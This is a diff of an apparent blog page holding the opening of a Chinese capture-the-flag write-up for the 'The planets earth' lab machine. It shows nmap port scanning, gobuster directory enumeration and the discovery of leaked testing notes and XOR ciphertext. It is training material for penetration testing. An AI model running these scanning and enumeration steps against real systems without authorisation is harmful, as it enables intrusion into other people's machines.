+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E7%AA%81%E5%8F%91%E7%89%B9%E5%BE%81%E8%AF%8D%E5%85%83%E8%87%AA%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
+      基于突发特征词元自学习的未知加密恶意流量检测方法</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0322fd2da3e27f54e6647ac98dce6412" class="toggle"  />
+    <label for="section-0322fd2da3e27f54e6647ac98dce6412" class="flex">
+      <a href="/docs/skills/" class="">
+        技能</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/kali-linux/" class="">
+      kali linux基础</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/SwitchyOmega-mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
+      SwitchyOmega mv3操作记录</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/win-&#43;-r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
+      win &#43; r常用指令</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali-linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/" class="">
+      基于vmware的kali linux下的docker部署(坑多)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/" class="">
+      网站构建</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-46cca3cee31003e60d06ca1be37ae652" class="toggle"  />
+    <label for="section-46cca3cee31003e60d06ca1be37ae652" class="flex">
+      <a href="/docs/navigation/" class="">
+        导航门户</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E9%9D%B6%E5%9C%BA/" class="">
+      靶场</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E8%AE%BA%E6%96%87/" class="">
+      论文</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B7%A5%E4%BD%9C/" class="">
+      工作</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Function/" class="">
+      Function</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/AI/" class="">
+      AI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Life/" class="">
+      Life</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B9%B3%E5%8F%B0/" class="">
+      平台</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E6%9C%BA%E5%9C%BA/" class="">
+      机场</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li><li><a href="https://github.com/vnccer" target="_blank" rel="noopener">Github</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>The planets earth</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#总结">总结</a></li>
+    <li><a href="#一信息收集">一、信息收集</a>
+      <ul>
+        <li><a href="#11-端口信息收集">1.1 端口信息收集</a></li>
+        <li><a href="#12-web信息收集">1.2 Web信息收集</a>
+          <ul>
+            <li><a href="#121-域名earthlocal">1.2.1 域名earth.local</a></li>
+            <li><a href="#122-子域名terratestearthlocal">1.2.2 子域名terratest.earth.local</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#二漏洞攻击">二、漏洞攻击</a>
+      <ul>
+        <li><a href="#21-密码破解">2.1 密码破解</a></li>
+        <li><a href="#22-获取user_flag">2.2 获取user_flag</a></li>
+        <li><a href="#23-反弹shell">2.3 反弹shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#三提权">三、提权</a>
+      <ul>
+        <li><a href="#31-查找可提权命令">3.1 查找可提权命令</a></li>
+        <li><a href="#32-reset_root分析">3.2 reset_root分析</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="总结">总结<a class="anchor" href="#%e6%80%bb%e7%bb%93">#</a></h1>
+<p>信息收集发现web服务和管理后台，利用xor加密特性破解管理员密码，成功获取用户权限并通过16位转换绕过反弹shell，通过分析SUID文件并创建触发器文件提权到root</p>
+<h1 id="一信息收集">一、信息收集<a class="anchor" href="#%e4%b8%80%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86">#</a></h1>
+<h2 id="11-端口信息收集">1.1 端口信息收集<a class="anchor" href="#11-%e7%ab%af%e5%8f%a3%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -A -p- 192.168.174.133 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#ff6ac1">(</span> https://nmap.org <span style="color:#ff6ac1">)</span> at 2026-02-12 02:51 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff6ac1">for</span> 192.168.174.133
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff6ac1">(</span>0.00068s latency<span style="color:#ff6ac1">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ff9f43">65373</span> filtered tcp ports <span style="color:#ff6ac1">(</span>no-response<span style="color:#ff6ac1">)</span>, <span style="color:#ff9f43">159</span> filtered tcp ports <span style="color:#ff6ac1">(</span>admin-prohibited<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.6 <span style="color:#ff6ac1">(</span>protocol 2.0<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ff9f43">256</span> 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 <span style="color:#ff6ac1">(</span>ECDSA<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ff9f43">256</span> b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 <span style="color:#ff6ac1">(</span>ED25519<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http     Apache httpd 2.4.51 <span style="color:#ff6ac1">((</span>Fedora<span style="color:#ff6ac1">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Bad Request <span style="color:#ff6ac1">(</span>400<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.51 <span style="color:#ff6ac1">(</span>Fedora<span style="color:#ff6ac1">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+</span></span><span style="display:flex;"><span>443/tcp open  ssl/http Apache httpd 2.4.51 <span style="color:#ff6ac1">((</span>Fedora<span style="color:#ff6ac1">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Test Page <span style="color:#ff6ac1">for</span> the HTTP Server on Fedora
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: <span style="color:#ff5c57">commonName</span><span style="color:#ff6ac1">=</span>earth.local/stateOrProvinceName<span style="color:#ff6ac1">=</span>Space
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-10-12T23:26:31
+</span></span><span style="display:flex;"><span>|_Not valid after:  2031-10-10T23:26:31
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.51 <span style="color:#ff6ac1">(</span>Fedora<span style="color:#ff6ac1">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent <span style="color:#ff5c57">time</span>
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:47:0F:CB <span style="color:#ff6ac1">(</span>VMware<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ff9f43">1</span> open and <span style="color:#ff9f43">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose|router|storage-misc
+</span></span><span style="display:flex;"><span>Running <span style="color:#ff6ac1">(</span>JUST GUESSING<span style="color:#ff6ac1">)</span>: Linux 4.X|5.X|6.X|2.6.X|3.X <span style="color:#ff6ac1">(</span>97%<span style="color:#ff6ac1">)</span>, MikroTik RouterOS 7.X <span style="color:#ff6ac1">(</span>97%<span style="color:#ff6ac1">)</span>, Synology DiskStation Manager 5.X <span style="color:#ff6ac1">(</span>88%<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 4.15 - 5.19 <span style="color:#ff6ac1">(</span>97%<span style="color:#ff6ac1">)</span>, Linux 5.0 - 5.14 <span style="color:#ff6ac1">(</span>97%<span style="color:#ff6ac1">)</span>, MikroTik RouterOS 7.2 - 7.5 <span style="color:#ff6ac1">(</span>Linux 5.6.3<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">(</span>97%<span style="color:#ff6ac1">)</span>, Linux 4.19 <span style="color:#ff6ac1">(</span>95%<span style="color:#ff6ac1">)</span>, OpenWrt 21.02 <span style="color:#ff6ac1">(</span>Linux 5.4<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">(</span>95%<span style="color:#ff6ac1">)</span>, Linux 6.0 <span style="color:#ff6ac1">(</span>95%<span style="color:#ff6ac1">)</span>, Linux 5.4 - 5.10 <span style="color:#ff6ac1">(</span>91%<span style="color:#ff6ac1">)</span>, Linux 2.6.32 <span style="color:#ff6ac1">(</span>91%<span style="color:#ff6ac1">)</span>, Linux 2.6.32 - 3.13 <span style="color:#ff6ac1">(</span>91%<span style="color:#ff6ac1">)</span>, Linux 3.10 - 4.11 <span style="color:#ff6ac1">(</span>91%<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#ff6ac1">for</span> host <span style="color:#ff6ac1">(</span><span style="color:#ff5c57">test</span> conditions non-ideal<span style="color:#ff6ac1">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ff9f43">1</span> hop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE
+</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">1</span>   0.68 ms 192.168.174.133
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff6ac1">done</span>: <span style="color:#ff9f43">1</span> IP address <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">1</span> host up<span style="color:#ff6ac1">)</span> scanned in 174.28 seconds</span></span></code></pre></div><p>在443/tcp端口的<code>ssl-cert</code>部分发现域名信息，说明该ip在http服务中配置了两个域名：</p>
+<ul>
+<li><code>earth.local</code></li>
+<li><code>terratest.earth.local</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>| ssl-cert: Subject: <span style="color:#ff5c57">commonName</span><span style="color:#ff6ac1">=</span>earth.local/stateOrProvinceName<span style="color:#ff6ac1">=</span>Space
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span></span></code></pre></div><p>由于这是<code>.local</code>域名，kali无法直接通过浏览器访问，需要进行本地DNS解析映射（在<code>/etc/hosts</code>文件中添加ip地址和域名）
+<code>sudo nano /etc/hosts</code>，加入192.168.174.133 earth.local terratest.earth.local</p>
+<h2 id="12-web信息收集">1.2 Web信息收集<a class="anchor" href="#12-web%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86">#</a></h2>
+<h3 id="121-域名earthlocal">1.2.1 域名earth.local<a class="anchor" href="#121-%e5%9f%9f%e5%90%8dearthlocal">#</a></h3>
+<p>访问<code>https://earth.local</code>，发现可以发送信息，但需要密钥，还有加密的Previous Messages
 <strong>注意：这里用https，因此443端口是https，80端口才是http</strong>
-Previous Messages:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>00
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>    37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>    3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>    2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>gobuster dir -u http://earth.local -w /usr/share/dirb/wordlists/common.txt</span></span></code></pre></div><p>发现<code>/admin</code>目录，访问后是登录界面
-发现<code>/cgi-bin/</code>目录，禁止访问</p><h3 id=122-子域名terratestearthlocal>1.2.2 子域名terratest.earth.local<a class=anchor href=#122-%e5%ad%90%e5%9f%9f%e5%90%8dterratestearthlocal>#</a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>gobuster dir -u https://terratest.earth.local -w /usr/share/dirb/wordlists/common.txt -k</span></span></code></pre></div><p>结果有如下内容，接着访问<code>https//terratest.earth.local/robots.txt</code></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>/index.html           (Status: 200) [Size: 26]
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>/robots.txt           (Status: 200) [Size: 521]</span></span></code></pre></div><p>发现有testingnotes文件，测试为txt格式，接着访问<code>https://terratest.earth.local/testingnotes.txt</code>，获得如下信息</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>Testing secure messaging system notes:
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>*Using XOR encryption as the algorithm, should be safe as used in RSA.
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>*Earth has confirmed they have received our sent messages.
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>*testdata.txt was used to test encryption.
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>*terra used as username for admin portal.
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">6</span><span>Todo:
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">7</span><span>*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">8</span><span>*Need to test different key lengths to protect against bruteforce. How long should the key be?
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">9</span><span>*Need to improve the interface of the messaging interface and the admin panel, it&#39;s currently very basic.</span></span></code></pre></div><ul><li>得知加密算法为XOR</li><li>用户名为<code>terra</code></li><li>存在<code>testdata.txt</code>文件用于测试加密</li></ul><p>接着访问<code>https://terratest.earth.local/testdata.txt</code>，获得如下信息</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span></span></code></pre></div><p><strong>梳理下来</strong>，目前重要url有：
-<a href=https://earth.local/>https://earth.local/</a>
-<a href=https://earth.local/admin/>https://earth.local/admin/</a>
-<a href=https://terratest.earth.local/robots.txt>https://terratest.earth.local/robots.txt</a>
-<a href=https://terratest.earth.local/testingnotes.txt>https://terratest.earth.local/testingnotes.txt</a>
-<a href=https://terratest.earth.local/testdata.txt>https://terratest.earth.local/testdata.txt</a></p><p>重要数据有：</p><ul><li>testdata中数据</li></ul><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span></span></code></pre></div><ul><li>earth.local中数据，Previous Messages:</li></ul><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>00
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>    37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>    3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>    2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span></span></code></pre></div><h1 id=二漏洞攻击>二、漏洞攻击<a class=anchor href=#%e4%ba%8c%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb>#</a></h1><h2 id=21-密码破解>2.1 密码破解<a class=anchor href=#21-%e5%af%86%e7%a0%81%e7%a0%b4%e8%a7%a3>#</a></h2><p>根据提示，用XOR（异或）加密算法解密，编写的python脚本中，只用了<code>previous messages</code>中的最后一段，这是因为XOR运算具有<strong>排他性</strong>和<strong>长度匹配原则</strong>
+Previous Messages:</p>
+<pre tabindex="0"><code>00
+    37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
+    3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
+    2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</code></pre><div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>gobuster dir -u http://earth.local -w /usr/share/dirb/wordlists/common.txt</span></span></code></pre></div><p>发现<code>/admin</code>目录，访问后是登录界面
+发现<code>/cgi-bin/</code>目录，禁止访问</p>
+<h3 id="122-子域名terratestearthlocal">1.2.2 子域名terratest.earth.local<a class="anchor" href="#122-%e5%ad%90%e5%9f%9f%e5%90%8dterratestearthlocal">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>gobuster dir -u https://terratest.earth.local -w /usr/share/dirb/wordlists/common.txt -k</span></span></code></pre></div><ul>
+<li>其中<code>-k</code>忽略证书问题引起的验证错误，继续连接</li>
+</ul>
